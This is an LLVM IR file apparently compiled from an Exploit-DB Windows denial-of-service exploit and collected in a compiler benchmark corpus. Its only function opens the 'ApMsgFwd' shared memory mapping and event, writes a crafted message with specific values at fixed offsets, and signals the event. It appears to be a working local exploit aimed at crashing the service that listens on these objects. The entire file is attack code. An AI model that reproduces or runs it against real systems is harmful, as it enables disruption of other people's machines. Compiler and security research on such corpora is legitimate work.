; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_44610.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_44610.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@FILE_MAP_WRITE = common dso_local global i32 0, align 4
@FALSE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [29 x i8] c"ApMsgFwd File Mapping Object\00", align 1
@.str.1 = private unnamed_addr constant [26 x i8] c"OpenFileMapping Failed !\0A\00", align 1
@.str.2 = private unnamed_addr constant [24 x i8] c"MapViewOfFile Failed !\0A\00", align 1
@EVENT_MODIFY_STATE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [21 x i8] c"ApMsgFwd Event Start\00", align 1
@.str.4 = private unnamed_addr constant [20 x i8] c"OpenEvent Failed !\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = load i32, i32* @FILE_MAP_WRITE, align 4
  %11 = load i32, i32* @FALSE, align 4
  %12 = call i32 @OpenFileMappingA(i32 %10, i32 %11, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0))
  store i32 %12, i32* %6, align 4
  %13 = icmp ne i32 %12, 0
  br i1 %13, label %16, label %14

14:                                               ; preds = %2
  %15 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0))
  br label %49

16:                                               ; preds = %2
  %17 = load i32, i32* %6, align 4
  %18 = load i32, i32* @FILE_MAP_WRITE, align 4
  %19 = call i32* @MapViewOfFile(i32 %17, i32 %18, i32 0, i32 0, i32 416)
  store i32* %19, i32** %9, align 8
  %20 = icmp ne i32* %19, null
  br i1 %20, label %23, label %21

21:                                               ; preds = %16
  %22 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0))
  br label %46

23:                                               ; preds = %16
  %24 = load i32, i32* @EVENT_MODIFY_STATE, align 4
  %25 = load i32, i32* @FALSE, align 4
  %26 = call i32 @OpenEventA(i32 %24, i32 %25, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0))
  store i32 %26, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = icmp ne i32 %27, 0
  br i1 %28, label %31, label %29

29:                                               ; preds = %23
  %30 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.4, i64 0, i64 0))
  br label %43

31:                                               ; preds = %23
  %32 = load i32*, i32** %9, align 8
  %33 = call i32 @ZeroMemory(i32* %32, i32 416)
  %34 = load i32*, i32** %9, align 8
  store i32 9, i32* %34, align 4
  %35 = load i32*, i32** %9, align 8
  %36 = getelementptr inbounds i32, i32* %35, i64 96
  store i32 1560662109, i32* %36, align 4
  %37 = load i32*, i32** %9, align 8
  %38 = getelementptr inbounds i32, i32* %37, i64 100
  store i32 -799210032, i32* %38, align 4
  %39 = load i32, i32* %7, align 4
  %40 = call i32 @SetEvent(i32 %39)
  %41 = load i32, i32* %7, align 4
  %42 = call i32 @CloseHandle(i32 %41)
  br label %43

43:                                               ; preds = %31, %29
  %44 = load i32*, i32** %9, align 8
  %45 = call i32 @UnmapViewOfFile(i32* %44)
  br label %46

46:                                               ; preds = %43, %21
  %47 = load i32, i32* %6, align 4
  %48 = call i32 @CloseHandle(i32 %47)
  br label %49

49:                                               ; preds = %46, %14
  ret i32 0
}

declare dso_local i32 @OpenFileMappingA(i32, i32, i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32* @MapViewOfFile(i32, i32, i32, i32, i32) #1

declare dso_local i32 @OpenEventA(i32, i32, i8*) #1

declare dso_local i32 @ZeroMemory(i32*, i32) #1

declare dso_local i32 @SetEvent(i32) #1

declare dso_local i32 @CloseHandle(i32) #1

declare dso_local i32 @UnmapViewOfFile(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
